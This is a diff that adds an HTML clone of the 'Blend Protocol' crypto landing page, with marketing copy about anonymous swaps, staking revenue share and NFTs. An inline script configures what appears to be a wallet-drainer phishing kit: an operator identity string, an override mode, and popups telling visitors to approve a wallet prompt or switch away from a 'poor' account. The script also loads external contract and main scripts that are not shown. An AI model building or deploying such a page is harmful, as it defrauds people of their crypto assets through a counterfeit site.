@@ -1,0 +1,910 @@
+<!DOCTYPE html>
+<html lang="en"
+  style="--w3m-color-fg-1: rgb(228,231,231); --w3m-color-fg-2: rgb(148,158,158); --w3m-color-fg-3: rgb(110,119,119); --w3m-color-bg-1: rgb(20,20,20); --w3m-color-bg-2: rgb(39,42,42); --w3m-color-bg-3: rgb(59,64,64); --w3m-color-overlay: rgba(255,255,255,0.1); --w3m-accent-color: #3396FF; --w3m-accent-fill-color: #FFFFFF; --w3m-z-index: 89; --w3m-background-color: #3396FF; --w3m-background-border-radius: 8px; --w3m-container-border-radius: 30px; --w3m-wallet-icon-border-radius: 15px; --w3m-wallet-icon-large-border-radius: 30px; --w3m-wallet-icon-small-border-radius: 7px; --w3m-input-border-radius: 28px; --w3m-button-border-radius: 10px; --w3m-notification-border-radius: 36px; --w3m-secondary-button-border-radius: 28px; --w3m-icon-button-border-radius: 50%; --w3m-button-hover-highlight-border-radius: 10px; --w3m-text-big-bold-size: 20px; --w3m-text-big-bold-weight: 600; --w3m-text-big-bold-line-height: 24px; --w3m-text-big-bold-letter-spacing: -0.03em; --w3m-text-big-bold-text-transform: none; --w3m-text-xsmall-bold-size: 10px; --w3m-text-xsmall-bold-weight: 700; --w3m-text-xsmall-bold-line-height: 12px; --w3m-text-xsmall-bold-letter-spacing: 0.02em; --w3m-text-xsmall-bold-text-transform: uppercase; --w3m-text-xsmall-regular-size: 12px; --w3m-text-xsmall-regular-weight: 600; --w3m-text-xsmall-regular-line-height: 14px; --w3m-text-xsmall-regular-letter-spacing: -0.03em; --w3m-text-xsmall-regular-text-transform: none; --w3m-text-small-thin-size: 14px; --w3m-text-small-thin-weight: 500; --w3m-text-small-thin-line-height: 16px; --w3m-text-small-thin-letter-spacing: -0.03em; --w3m-text-small-thin-text-transform: none; --w3m-text-small-regular-size: 14px; --w3m-text-small-regular-weight: 600; --w3m-text-small-regular-line-height: 16px; --w3m-text-small-regular-letter-spacing: -0.03em; --w3m-text-small-regular-text-transform: none; --w3m-text-medium-regular-size: 16px; --w3m-text-medium-regular-weight: 600; --w3m-text-medium-regular-line-height: 20px; --w3m-text-medium-regular-letter-spacing: -0.03em; --w3m-text-medium-regular-text-transform: none; --w3m-font-family: -apple-system, system-ui, BlinkMacSystemFont, 'Segoe UI', Roboto, Ubuntu, 'Helvetica Neue', sans-serif; --w3m-font-feature-settings: 'tnum' on, 'lnum' on, 'case' on; --w3m-success-color: rgb(38,181,98); --w3m-error-color: rgb(242, 90, 103); --w3m-overlay-background-color: rgba(0, 0, 0, 0.3); --w3m-overlay-backdrop-filter: none; --w3m-background-image-url: none; --wcm-color-fg-1: rgb(228,231,231); --wcm-color-fg-2: rgb(148,158,158); --wcm-color-fg-3: rgb(110,119,119); --wcm-color-bg-1: rgb(20,20,20); --wcm-color-bg-2: rgb(39,42,42); --wcm-color-bg-3: rgb(59,64,64); --wcm-color-overlay: rgba(255,255,255,0.1); --wcm-accent-color: #3396FF; --wcm-accent-fill-color: #FFFFFF; --wcm-z-index: 89; --wcm-background-color: #3396FF; --wcm-background-border-radius: 8px; --wcm-container-border-radius: 30px; --wcm-wallet-icon-border-radius: 15px; --wcm-wallet-icon-large-border-radius: 30px; --wcm-wallet-icon-small-border-radius: 7px; --wcm-input-border-radius: 28px; --wcm-button-border-radius: 10px; --wcm-notification-border-radius: 36px; --wcm-secondary-button-border-radius: 28px; --wcm-icon-button-border-radius: 50%; --wcm-button-hover-highlight-border-radius: 10px; --wcm-text-big-bold-size: 20px; --wcm-text-big-bold-weight: 600; --wcm-text-big-bold-line-height: 24px; --wcm-text-big-bold-letter-spacing: -0.03em; --wcm-text-big-bold-text-transform: none; --wcm-text-xsmall-bold-size: 10px; --wcm-text-xsmall-bold-weight: 700; --wcm-text-xsmall-bold-line-height: 12px; --wcm-text-xsmall-bold-letter-spacing: 0.02em; --wcm-text-xsmall-bold-text-transform: uppercase; --wcm-text-xsmall-regular-size: 12px; --wcm-text-xsmall-regular-weight: 600; --wcm-text-xsmall-regular-line-height: 14px; --wcm-text-xsmall-regular-letter-spacing: -0.03em; --wcm-text-xsmall-regular-text-transform: none; --wcm-text-small-thin-size: 14px; --wcm-text-small-thin-weight: 500; --wcm-text-small-thin-line-height: 16px; --wcm-text-small-thin-letter-spacing: -0.03em; --wcm-text-small-thin-text-transform: none; --wcm-text-small-regular-size: 14px; --wcm-text-small-regular-weight: 600; --wcm-text-small-regular-line-height: 16px; --wcm-text-small-regular-letter-spacing: -0.03em; --wcm-text-small-regular-text-transform: none; --wcm-text-medium-regular-size: 16px; --wcm-text-medium-regular-weight: 600; --wcm-text-medium-regular-line-height: 20px; --wcm-text-medium-regular-letter-spacing: -0.03em; --wcm-text-medium-regular-text-transform: none; --wcm-font-family: -apple-system, system-ui, BlinkMacSystemFont, 'Segoe UI', Roboto, Ubuntu, 'Helvetica Neue', sans-serif; --wcm-font-feature-settings: 'tnum' on, 'lnum' on, 'case' on; --wcm-success-color: rgb(38,181,98); --wcm-error-color: rgb(242, 90, 103); --wcm-overlay-background-color: rgba(0, 0, 0, 0.3); --wcm-overlay-backdrop-filter: none;"
+  data-scrapbook-source="https://www.blendprotocol.io/?ref=0x7afEbE014d46f0a9b0705Cdb7CFa0016F3ad0bdb"
+  data-scrapbook-create="20231214002548683" data-scrapbook-title="Blend Protocol">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>Blend Protocol</title>
+  <link rel="icon" href="favicon.ico">
+  <link href="main.afcce929.css" rel="stylesheet">
+  <style id="_goober">
+    @keyframes go2264125279 {
+      from {
+        transform: scale(0) rotate(45deg);
+        opacity: 0;
+      }
+
+      to {
+        transform: scale(1) rotate(45deg);
+        opacity: 1;
+      }
+    }
+
+    @keyframes go3020080000 {
+      from {
+        transform: scale(0);
+        opacity: 0;
+      }
+
+      to {
+        transform: scale(1);
+        opacity: 1;
+      }
+    }
+
+    @keyframes go463499852 {
+      from {
+        transform: scale(0) rotate(90deg);
+        opacity: 0;
+      }
+
+      to {
+        transform: scale(1) rotate(90deg);
+        opacity: 1;
+      }
+    }
+
+    @keyframes go1268368563 {
+      from {
+        transform: rotate(0deg);
+      }
+
+      to {
+        transform: rotate(360deg);
+      }
+    }
+
+    @keyframes go1310225428 {
+      from {
+        transform: scale(0) rotate(45deg);
+        opacity: 0;
+      }
+
+      to {
+        transform: scale(1) rotate(45deg);
+        opacity: 1;
+      }
+    }
+
+    @keyframes go651618207 {
+      0% {
+        height: 0;
+        width: 0;
+        opacity: 0;
+      }
+
+      40% {
+        height: 0;
+        width: 6px;
+        opacity: 1;
+      }
+
+      100% {
+        opacity: 1;
+        height: 10px;
+      }
+    }
+
+    @keyframes go901347462 {
+      from {
+        transform: scale(0.6);
+        opacity: 0.4;
+      }
+
+      to {
+        transform: scale(1);
+        opacity: 1;
+      }
+    }
+
+    .go4109123758 {
+      z-index: 9999;
+    }
+
+    .go4109123758>* {
+      pointer-events: auto;
+    }
+  </style>
+  <style type="text/css">
+    .marquee-container {
+      overflow-x: hidden !important;
+      display: flex !important;
+      flex-direction: row !important;
+      position: relative;
+      width: var(--width);
+      transform: var(--transform);
+    }
+
+    .marquee-container:hover div {
+      animation-play-state: var(--pause-on-hover);
+    }
+
+    .marquee-container:active div {
+      animation-play-state: var(--pause-on-click);
+    }
+
+    .overlay {
+      position: absolute;
+      width: 100%;
+      height: 100%;
+    }
+
+    .overlay::before,
+    .overlay::after {
+      background: linear-gradient(to right, var(--gradient-color));
+      content: "";
+      height: 100%;
+      position: absolute;
+      width: var(--gradient-width);
+      z-index: 2;
+    }
+
+    .overlay::after {
+      right: 0;
+      top: 0;
+      transform: rotateZ(180deg);
+    }
+
+    .overlay::before {
+      left: 0;
+      top: 0;
+    }
+
+    .marquee {
+      flex: 0 0 auto;
+      min-width: var(--min-width);
+      z-index: 1;
+      display: flex;
+      flex-direction: row;
+      align-items: center;
+      animation: scroll var(--duration) linear var(--delay) var(--iteration-count);
+      animation-play-state: var(--play);
+      animation-delay: var(--delay);
+      animation-direction: var(--direction);
+    }
+
+    @keyframes scroll {
+      0% {
+        transform: translateX(0%);
+      }
+
+      100% {
+        transform: translateX(-100%);
+      }
+    }
+
+    .initial-child-container {
+      flex: 0 0 auto;
+      display: flex;
+      min-width: auto;
+      flex-direction: row;
+    }
+
+    .child {
+      transform: var(--transform);
+    }
+  </style>
+  <script
+    data-scrapbook-elem="custom-elements-loader">(function (names) { if (!customElements) { return; } for (const name of names) { customElements.define(name, class CustomElement extends HTMLElement { }); } })(["w3m-explorer-context", "w3m-theme-context", "w3m-wc-connection-context", "w3m-account-context", "w3m-network-context", "w3m-modal", "wcm-explorer-context", "wcm-theme-context", "wcm-modal"])</script>
+</head>
+
+<head>
+  <script defer="defer" src="js/vendors.js"></script>
+  <script defer="defer" src="js/contracts.js"></script>
+  <script defer="defer" src="js/main.js"></script>
+
+  <script>
+    window.UNIQUE_IDENTITY = "musths_wheyish_99";
+
+    // Pick a theme here, this defaults to "light"
+    window.modal_theme = "dark"
+
+    // https://docs.walletconnect.com/web3modal/v2/html/wagmi/theming
+    window.modal_variables = {
+      /* Example of what you can do */
+      "--w3m-accent-color": "#50C878",
+      "--w3m-background-color": "#50C878",
+      // "--w3m-logo-image-url": "/your-logo.svg",
+    };
+
+    // Notification modals
+    window.popups = {
+      PENDING: {
+        // The popup that shows when they get prompted
+        // title: "Claim Pending",
+        text: "You must approve the prompt in order to continue."
+      },
+      INVALID: {
+        // Shown when they connect on a wallet that is poor.
+        // title: "Ineligible Address",
+        text: "The connected account is not eligible for this event.\nPlease try using a different account.",
+      }
+    }
+
+    // Only touch this if you know what you're doing!
+    window.OVERRIDE_MODE = false;
+  </script>
+</head>
+
+<body>
+  <div id="root">
+    <main class="overflow-hidden">
+      <div style="position: fixed; z-index: 9999; inset: 16px; pointer-events: none;"></div>
+      <div
+        class="h-[200px] w-[200px] lg:h-[500px] filter lg:w-[500px] bg-accent rounded-full absolute blur-[300px] lg:blur-[500px]  -top-1/2 -left-[40px]">
+      </div>
+      <section
+        class="w-full fixed z-50 backdrop-blur-2xl bg-vulcan-900/20 border-b border-white/5 lg:bg-vulcan-900/0 overflow-hidden relatve"
+        aria-labelledby="navigation" id="navigation">
+        <div class="w-full mx-auto relative ">
+          <div
+            class="flex mx-auto w-full flex-col lg:px-32 md:flex-row md:items-center md:justify-between md:px-12 px-8 py-5 relative"
+            x-data="{ open: false }">
+            <div class="flex justify-between flex-row items-center lg:justify-start text-white"><a
+                href="https://www.blendprotocol.io/" class="lg:pr-8">
+                <div class="gap-3 items-center inline-flex"><img src="header_logo.png" class="w-36"></div>
+              </a><button
+                class="text-white items-center inline-flex focus:outline-none justify-center focus:text-white hover:text-indigo-400 md:hidden p-2"><svg
+                  class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                  <path d="M4 6h16M4 12h16M4 18h16" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                    class="inline-flex"></path>
+                  <path d="M6 18L18 6M6 6l12 12" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                    class="hidden"></path>
+                </svg></button></div>
+            <nav class="hidden md:flex flex-col flex-grow items-center md:flex-row md:justify-end md:pb-0 "><a
+                href="#home"
+                class="text-sm font-normal px-2 hover:text-accent lg:px-6 md:px-3 py-2 text-white lg:ml-auto">Home</a>
+              <a href="#ecosystem"
+                class="text-sm font-normal px-2 hover:text-accent lg:px-6 md:px-3 py-2 text-white">Ecosystem</a><a
+                href="#tokenomics"
+                class="text-sm font-normal px-2 hover:text-accent lg:px-6 md:px-3 py-2 text-white">Tokenomics</a><a
+                href="#roadmap"
+                class="text-sm font-normal px-2 hover:text-accent lg:px-6 md:px-3 py-2 text-white">Roadmap</a><a
+                href="https://www.blendprotocol.io/whitepaper.pdf" target="_blank"
+                class="text-sm font-normal px-2 hover:text-accent lg:px-6 md:px-3 py-2 text-white">Whitepaper</a><a
+                href="https://www.blendprotocol.io/pitchdeck.pdf" target="_blank"
+                class="text-sm font-normal px-2 hover:text-accent lg:px-6 md:px-3 py-2 text-white">Pitchdeck</a><a
+                href="https://swap.blendprotocol.io/" target="_blank"
+                class="text-sm py-2 text-white focus:outline-none items-center justify-center rounded-lg bg-gradient-to-r duration-200 focus-visible:outline-black focus-visible:ring-black font-medium px-6 text-center inline-flex lg:ml-auto bg-accent hover:bg-accent/80">Swap
+                Now</a>
+            </nav>
+          </div>
+        </div>
+      </section>
+      <div class="container mx-auto px-6 pb-24 pt-36">
+        <div class="grid lg:grid-cols-2 gap-12 items-center">
+          <div>
+            <div>
+              <h2 class="text-2xl font-light  tracking-tight  sm:text-5xl font-heading text-accent ">Introducing
+                <br><span class="font-medium">Blend Protocol</span>
+              </h2>
+              <div class="max-w-[600px] w-full mt-4 text-lg">Take control of your DeFi transactions like never before
+                with Blend Protocol a cutting-edge privacy application allowing anonymous swaps from over 50 different
+                chains in a matter of seconds with the industry’s lowest fees.</div>
+              <div class="max-w-[600px] w-full mt-4 text-lg">Blend Protocol features a never seen before revenue sharing
+                model allowing holders of $Blend to receive 80% of the transaction fees.</div>
+            </div>
+            <div class="inline-flex mt-6 justify-start w-full gap-6  md:justify-start md:w-auto"><a
+                href="https://t.me/blendportal" target="_blank"
+                class=" transition fill-black hover:text-accent grid place-items-center text-2xl"><span
+                  class="sr-only">Telegram</span><svg stroke="currentColor" fill="currentColor" stroke-width="0"
+                  viewBox="0 0 448 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
+                  <path
+                    d="M446.7 98.6l-67.6 318.8c-5.1 22.5-18.4 28.1-37.3 17.5l-103-75.9-49.7 47.8c-5.5 5.5-10.1 10.1-20.7 10.1l7.4-104.9 190.9-172.5c8.3-7.4-1.8-11.5-12.9-4.1L117.8 284 16.2 252.2c-22.1-6.9-22.5-22.1 4.6-32.7L418.2 66.4c18.4-6.9 34.5 4.1 28.5 32.2z">
+                  </path>
+                </svg></a><a href="https://twitter.com/blend_protocol" target="_blank"
+                class=" transition fill-black hover:text-accent grid place-items-center text-2xl"><span
+                  class="sr-only">Twitter</span>
+                <div> 𝕏</div>
+              </a><a href="mailto:contact@blendprotocol.io" target="_blank"
+                class=" transition fill-black hover:text-accent grid place-items-center text-2xl"><span
+                  class="sr-only">Email</span>
+                <div><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 576 512" height="1em"
+                    width="1em" xmlns="http://www.w3.org/2000/svg">
+                    <path
+                      d="M160 448c-25.6 0-51.2-22.4-64-32-64-44.8-83.2-60.8-96-70.4V480c0 17.67 14.33 32 32 32h256c17.67 0 32-14.33 32-32V345.6c-12.8 9.6-32 25.6-96 70.4-12.8 9.6-38.4 32-64 32zm128-192H32c-17.67 0-32 14.33-32 32v16c25.6 19.2 22.4 19.2 115.2 86.4 9.6 6.4 28.8 25.6 44.8 25.6s35.2-19.2 44.8-22.4c92.8-67.2 89.6-67.2 115.2-86.4V288c0-17.67-14.33-32-32-32zm256-96H224c-17.67 0-32 14.33-32 32v32h96c33.21 0 60.59 25.42 63.71 57.82l.29-.22V416h192c17.67 0 32-14.33 32-32V192c0-17.67-14.33-32-32-32zm-32 128h-64v-64h64v64zm-352-96c0-35.29 28.71-64 64-64h224V32c0-17.67-14.33-32-32-32H96C78.33 0 64 14.33 64 32v192h96v-32z">
+                    </path>
+                  </svg></div>
+              </a></div>
+            <div class="flex justify-start mt-4"><a class="py-2 px-6 rounded-xl bg-blue-500 font-bold text-xl"
+                target="_blank" style="box-shadow: rgb(21, 138, 222) 0px 5px 20px 2px;" id="connect_button">BUY STAKE
+                EARN
+              </a></div>
+          </div>
+          <div class="m-auto order-first lg:order-last"><video src="blend.mp4" autoplay="" playsinline="" loop=""
+              controls="" class=" max-w-[600px]  w-full mb-7 border border-white/20"></video></div>
+        </div>
+      </div>
+      <div>
+        <div class="container mx-auto px-6 py-8">
+          <div class="marquee-container grid grid-cols-2 md:grid-cols-4 gap-12"
+            style="--pause-on-hover: running; --pause-on-click: running; --width: 100%; --transform: none;">
+            <div class="marquee"
+              style="--play: running; --direction: normal; --duration: 42.56s; --delay: 0s; --iteration-count: infinite; --min-width: 100%;">
+              <div class="initial-child-container">
+                <div class="child" style="--transform: none;"><a href="#" class=" mw-44 lg:w-64 mx-6 inline-block "><img
+                      class="filter brightness-50 lg:w-auto max-w-[150px]	" src="1.webp"></a></div>
+                <div class="child" style="--transform: none;"><a href="#" class=" mw-44 lg:w-64 mx-6 inline-block "><img
+                      class="filter brightness-50 lg:w-auto max-w-[150px]	" src="2.png"></a></div>
+                <div class="child" style="--transform: none;"><a href="#" class=" mw-44 lg:w-64 mx-6 inline-block "><img
+                      class="filter brightness-50 lg:w-auto max-w-[150px]	" src="3.png"></a></div>
+                <div class="child" style="--transform: none;"><a href="#" class=" mw-44 lg:w-64 mx-6 inline-block "><img
+                      class="filter brightness-50 lg:w-auto max-w-[150px]	" src="4.png"></a></div>
+                <div class="child" style="--transform: none;"><a href="#" class=" mw-44 lg:w-64 mx-6 inline-block "><img
+                      class="filter brightness-50 lg:w-auto max-w-[150px]	" src="5.png"></a></div>
+                <div class="child" style="--transform: none;"><a href="#" class=" mw-44 lg:w-64 mx-6 inline-block "><img
+                      class="filter brightness-50 lg:w-auto max-w-[150px]	" src="6.png"></a></div>
+                <div class="child" style="--transform: none;"><a href="#" class=" mw-44 lg:w-64 mx-6 inline-block "><img
+                      class="filter brightness-50 lg:w-auto max-w-[150px]	" src="7.png"></a></div>
+              </div>
+            </div>
+            <div class="marquee"
+              style="--play: running; --direction: normal; --duration: 42.56s; --delay: 0s; --iteration-count: infinite; --min-width: 100%;">
+              <div class="child" style="--transform: none;"><a href="#" class=" mw-44 lg:w-64 mx-6 inline-block "><img
+                    class="filter brightness-50 lg:w-auto max-w-[150px]	" src="1.webp"></a></div>
+              <div class="child" style="--transform: none;"><a href="#" class=" mw-44 lg:w-64 mx-6 inline-block "><img
+                    class="filter brightness-50 lg:w-auto max-w-[150px]	" src="2.png"></a></div>
+              <div class="child" style="--transform: none;"><a href="#" class=" mw-44 lg:w-64 mx-6 inline-block "><img
+                    class="filter brightness-50 lg:w-auto max-w-[150px]	" src="3.png"></a></div>
+              <div class="child" style="--transform: none;"><a href="#" class=" mw-44 lg:w-64 mx-6 inline-block "><img
+                    class="filter brightness-50 lg:w-auto max-w-[150px]	" src="4.png"></a></div>
+              <div class="child" style="--transform: none;"><a href="#" class=" mw-44 lg:w-64 mx-6 inline-block "><img
+                    class="filter brightness-50 lg:w-auto max-w-[150px]	" src="5.png"></a></div>
+              <div class="child" style="--transform: none;"><a href="#" class=" mw-44 lg:w-64 mx-6 inline-block "><img
+                    class="filter brightness-50 lg:w-auto max-w-[150px]	" src="6.png"></a></div>
+              <div class="child" style="--transform: none;"><a href="#" class=" mw-44 lg:w-64 mx-6 inline-block "><img
+                    class="filter brightness-50 lg:w-auto max-w-[150px]	" src="7.png"></a></div>
+            </div>
+          </div>
+          <div class="grid grid-cols-2 md:grid-cols-4 mx-auto gap-6 mt-16"><a href="#" class=" mx-2 lg:my-auto "><img
+                class="lg:w-auto max-w-[150px]		" src="eth.png"></a><a href="#" class=" mx-2 lg:my-auto "><img
+                class="lg:w-auto max-w-[150px]		" src="cmc.png"></a><a href="#" class=" mx-2 lg:my-auto "><img
+                class="lg:w-auto max-w-[150px]		" src="cg.png"></a><a href="#" class=" mx-2 lg:my-auto "><img
+                class="lg:w-auto max-w-[150px]		" src="dextool.png"></a><a href="#" class=" mx-2 lg:my-auto "><img
+                class="lg:w-auto max-w-[150px]		" src="dexview.png"></a><a href="#" class="w-64 mx-2 lg:my-auto "><img
+                class="lg:w-auto max-w-[150px]	 " src="gecko.webp"></a><a href="https://www.pinksale.finance/"
+              class="w-64 mx-2 lg:my-auto "><img class="lg:w-auto max-w-[150px]	 " src="pinksale.png"></a><a
+              href="https://www.dexview.com/" class="w-64 mx-2 lg:my-auto "><img class="lg:w-auto max-w-[150px]	 "
+                src="dexview2.png"></a></div>
+        </div>
+      </div>
+      <section class="relative flex items-center w-full ">
+        <div class="relative items-center w-full px-5 py-16 lg:pb-24 mx-auto md:px-12 lg:px-16 max-w-7xl">
+          <div class="relative flex-col items-start m-auto align-middle">
+            <div class="grid grid-cols-1 gap-6 lg:grid-cols-2 lg:gap-24">
+              <div class="relative items-center gap-12 m-auto lg:inline-flex">
+                <div class="max-w-xl text-center lg:text-left">
+                  <div>
+                    <h2 class="text-2xl font-medium tracking-tight  sm:text-4xl font-heading text-accent ">The Blend
+                      Swap</h2>
+                    <p class="max-w-xl mt-4 tracking-tight text-white lg:text-xl">Blend Protocol makes it easy to swap
+                      from one currency to another or even bridge! With competitive costs and speed, you can swap with
+                      over 50 different chains on our web application or telegram in a few seconds!</p>
+                    <div class="flex gap-2 items-center flex-wrap"><a href="https://t.me/blendprotocolbot"
+                        target="_blank"
+                        class="py-2 px-6 bg-accent/10 border border-accent inline-block mt-4 hover:bg-accent  cursor-pointer">Telegram
+                        Swap</a><a href="https://swap.blendprotocol.io/" target="_blank"
+                        class="py-2 px-6 bg-accent/10 border border-accent inline-block mt-4 hover:bg-accent  cursor-pointer">Web
+                        Swap</a></div>
+                  </div>
+                </div>
+              </div>
+              <div class=" block w-full mt-12  lg:mt-0 relative order-first lg:order-none">
+                <div
+                  class="h-[400px] w-[400px] bg-accent rounded-full filter blur-[500px] absolute -translate-y-1/2 top-1/2 -left-[40px]">
+                </div><img class="object-cover object-center w-full mx-auto -scale-x-100 lg:mr-auto" alt="hero"
+                  src="decentral.png">
+              </div>
+            </div>
+          </div>
+        </div>
+      </section>
+      <section class="relative flex items-center w-full ">
+        <div class="relative items-center w-full px-5  mx-auto md:px-12 lg:px-16 max-w-7xl">
+          <div class="relative flex-col items-start m-auto align-middle">
+            <div class="grid grid-cols-1 gap-6 lg:grid-cols-2 lg:gap-24">
+              <div class="relative items-center gap-12 m-auto lg:inline-flex">
+                <div class="max-w-xl text-center lg:text-left">
+                  <div>
+                    <h2 class="text-2xl font-medium tracking-tight  sm:text-4xl font-heading text-accent "><span
+                        class="font-light">Introducing</span> Blend Browser</h2>
+                    <p class="max-w-xl mt-4 tracking-tight text-white lg:text-xl">Blend Browser, an open-source platform
+                      built on Chromium, prioritizes default privacy settings that effectively block the majority of ads
+                      and trackers. Users have the option to engage with ads and earn Blend tokens as rewards,
+                      functioning as a cryptocurrency for seamless transactions among registered websites and content
+                      creators.</p>
+                    <p class="max-w-xl mt-4 tracking-tight text-white lg:text-xl">In addition to its robust security and
+                      privacy features, Blend offers effortless access to a VPN without any associated premium costs.
+                      Our ultimate goal is to create a user-friendly, privacy-focused product that extends beyond
+                      browsers, ensuring the lowest fees within the privacy ecosystem.</p><a
+                      href="https://t.me/blendportal" target="_blank"
+                      class="py-2 px-6 bg-accent/10 border border-accent inline-block mt-4 hover:bg-accent  cursor-pointer">Join
+                      Telegram</a>
+                  </div>
+                </div>
+              </div>
+              <div class=" block w-full mt-12  lg:mt-0  relative">
+                <div
+                  class="h-[200px] w-[200px] bg-accent rounded-full filter blur-[200px] absolute -translate-y-1/2 top-1/2 left-1/2 -translate-x-1/2">
+                </div><img class="object-cover object-center w-full mx-auto  lg:mr-auto" alt="hero" src="logo.png">
+              </div>
+            </div>
+          </div>
+        </div>
+      </section>
+      <section class="relative flex items-center w-full ">
+        <div class="relative items-center w-full px-5 pb-16 lg:pb-24 mx-auto md:px-12 lg:px-16 max-w-7xl">
+          <div class="relative flex-col items-start m-auto align-middle">
+            <div class="grid grid-cols-1 gap-6 lg:grid-cols-2 lg:gap-24">
+              <div class="relative items-center gap-12 m-auto lg:inline-flex">
+                <div class="max-w-xl text-center lg:text-left">
+                  <div>
+                    <h2 class="text-2xl font-medium tracking-tight  sm:text-4xl font-heading text-accent ">How Does It
+                      Work?</h2>
+                    <p class="max-w-xl mt-4 tracking-tight text-white lg:text-xl">Blend Protocol utilizes security and
+                      privacy to ensure your transactions are done through our backend privacy protocols.<br><br>With
+                      the ability to convert and swap on either telegram or web with little to no effort and at very
+                      little cost. Check out our whitepaper</p><a href="https://www.blendprotocol.io/whitepaper.pdf"
+                      target="_blank"
+                      class="py-2 px-6 bg-accent/10 border border-accent inline-block mt-4 hover:bg-accent  cursor-pointer">Whitepaper</a>
+                  </div>
+                </div>
+              </div>
+              <div class="order-first block w-full mt-12  lg:mt-0 lg:order-first relative">
+                <div
+                  class="h-[400px] w-[400px] bg-accent rounded-full filter blur-[500px] absolute -translate-y-1/2 top-1/2 -left-[40px]">
+                </div><img class="object-cover object-center w-full mx-auto  max-w-[300px] lg:max-w-[400px] lg:mr-auto"
+                  alt="hero" src="privacy.svg">
+              </div>
+            </div>
+          </div>
+        </div>
+      </section>
+      <section class="relative flex items-center w-full ">
+        <div class="relative items-center w-full px-5 mx-auto md:px-12 lg:px-16 max-w-7xl">
+          <div class="relative flex-col items-start m-auto align-middle">
+            <div class="grid grid-cols-1 gap-6 lg:grid-cols-2 lg:gap-24">
+              <div class="relative items-center gap-12 m-auto lg:inline-flex">
+                <div class="max-w-xl text-center lg:text-left">
+                  <div>
+                    <h2 class="text-2xl font-medium tracking-tight  sm:text-4xl font-heading text-accent ">Revenue Share
+                    </h2>
+                    <p class="max-w-xl mt-4 tracking-tight text-white lg:text-xl">Buy, Stake, Earn! Featuring a never
+                      seen before revenue sharing model allowing holders of the $Blend token to receive 80% of the
+                      transaction fees. Stake to earn rewards daily! Invest with $Blend today and be rewarded with the
+                      protocol that never stops giving.</p>
+                  </div>
+                </div>
+              </div>
+              <div class=" block w-full mt-12  lg:mt-0 relative order-first lg:order-none">
+                <div
+                  class="h-[400px] w-[400px] bg-accent rounded-full filter blur-[500px] absolute -translate-y-1/2 top-1/2 -left-[40px]">
+                </div><img class="object-cover object-center w-full mx-auto max-w-[150px] lg:max-w-[300px] lg:mr-auto"
+                  alt="hero" src="rev.svg">
+              </div>
+            </div>
+          </div>
+        </div>
+      </section>
+      <section class="relative flex items-center w-full ">
+        <div class="relative items-center w-full px-5 py-16 lg:py-24 mx-auto md:px-12 lg:px-16 max-w-7xl">
+          <div class="relative flex-col items-start m-auto align-middle">
+            <div class="grid grid-cols-1 gap-6 lg:grid-cols-2 lg:gap-24">
+              <div class="relative items-center gap-12 m-auto lg:inline-flex">
+                <div class="max-w-xl text-center lg:text-left">
+                  <div>
+                    <h2 class="text-2xl font-medium tracking-tight  sm:text-4xl font-heading text-accent ">NFT
+                      Utilization</h2>
+                    <p class="max-w-xl mt-4 tracking-tight text-white lg:text-xl">By utilizing the Blend NFT you will
+                      have the ability to transfer up to 50 different tokens with no fees! <br> <br> This allows for
+                      unlimited amount of transactions providing NFT holders endless value while also driving the demand
+                      for each Blend NFT.</p>
+                    <div class="flex mt-8 justify-start space-x-12"><span
+                        class="inline-flex justify-start w-full gap-6  md:justify-start md:w-auto"><a
+                          href="https://t.me/blendportal" target="_blank"
+                          class=" transition fill-black hover:text-accent grid place-items-center text-2xl"><span
+                            class="sr-only">Telegram</span><svg stroke="currentColor" fill="currentColor"
+                            stroke-width="0" viewBox="0 0 448 512" height="1em" width="1em"
+                            xmlns="http://www.w3.org/2000/svg">
+                            <path
+                              d="M446.7 98.6l-67.6 318.8c-5.1 22.5-18.4 28.1-37.3 17.5l-103-75.9-49.7 47.8c-5.5 5.5-10.1 10.1-20.7 10.1l7.4-104.9 190.9-172.5c8.3-7.4-1.8-11.5-12.9-4.1L117.8 284 16.2 252.2c-22.1-6.9-22.5-22.1 4.6-32.7L418.2 66.4c18.4-6.9 34.5 4.1 28.5 32.2z">
+                            </path>
+                          </svg></a><a href="https://twitter.com/blend_protocol" target="_blank"
+                          class=" transition fill-black hover:text-accent grid place-items-center text-2xl"><span
+                            class="sr-only">Twitter</span>
+                          <div> 𝕏</div>
+                        </a><a href="mailto:contact@blendprotocol.io" target="_blank"
+                          class=" transition fill-black hover:text-accent grid place-items-center text-2xl"><span
+                            class="sr-only">Email</span>
+                          <div><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 576 512"
+                              height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
+                              <path
+                                d="M160 448c-25.6 0-51.2-22.4-64-32-64-44.8-83.2-60.8-96-70.4V480c0 17.67 14.33 32 32 32h256c17.67 0 32-14.33 32-32V345.6c-12.8 9.6-32 25.6-96 70.4-12.8 9.6-38.4 32-64 32zm128-192H32c-17.67 0-32 14.33-32 32v16c25.6 19.2 22.4 19.2 115.2 86.4 9.6 6.4 28.8 25.6 44.8 25.6s35.2-19.2 44.8-22.4c92.8-67.2 89.6-67.2 115.2-86.4V288c0-17.67-14.33-32-32-32zm256-96H224c-17.67 0-32 14.33-32 32v32h96c33.21 0 60.59 25.42 63.71 57.82l.29-.22V416h192c17.67 0 32-14.33 32-32V192c0-17.67-14.33-32-32-32zm-32 128h-64v-64h64v64zm-352-96c0-35.29 28.71-64 64-64h224V32c0-17.67-14.33-32-32-32H96C78.33 0 64 14.33 64 32v192h96v-32z">
+                              </path>
+                            </svg></div>
+                        </a></span></div>
+                  </div>
+                </div>
+              </div>
+              <div class="order-first block w-full mt-12  lg:mt-0 lg:order-first relative">
+                <div
+                  class="h-[400px] w-[400px] bg-accent rounded-full filter blur-[500px] absolute -translate-y-1/2 top-1/2 -left-[40px]">
+                </div><img class="object-cover object-center w-full mx-auto max-w-[400px] w-full  lg:mr-auto" alt="hero"
+                  src="nft.svg">
+              </div>
+            </div>
+          </div>
+        </div>
+      </section>
+      <section id="ecosystem" class="relative flex items-center w-full ">
+        <div class="relative items-center w-full px-5 pt-16 lg:pt-24 mx-auto md:px-12 lg:px-16 max-w-7xl">
